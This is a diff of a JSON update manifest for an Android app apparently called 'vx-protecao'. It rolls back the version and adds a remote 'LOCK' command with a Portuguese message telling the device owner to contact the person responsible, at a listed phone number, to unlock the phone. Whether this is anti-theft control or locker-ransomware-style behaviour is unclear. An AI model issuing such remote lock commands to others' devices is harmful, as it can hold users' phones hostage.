@@ -1,6 +1,11 @@
 {
-  "versionCode": 16,
-  "versionName": "3.0.8",
+  "versionCode": 14,
+  "versionName": "3.0.6",
   "url": "https://vxvulgooficial.github.io/vx-protecao/assets/vx-dono.apk",
-  "sha256": "80e566658185b7f4a0605d6f4b92f3753851ee5c66305ae6178c7f173ce0c564"
+  "sha256": "80e566658185b7f4a0605d6f4b92f3753851ee5c66305ae6178c7f173ce0c564",
+  "command": "LOCK",
+  "message": "Aparelho protegido pelo VX VULGO. Entre em contato com o responsável para liberá-lo. 13981677833",
+  "commandId": "VX-20261121-191141-36",
+  "sig": "33cb32b28074d62ed7f1b6202ec69cadc533b8673c5c7d9570056a36dc6783f5",
+  "autor": "VX VULGO"
 }
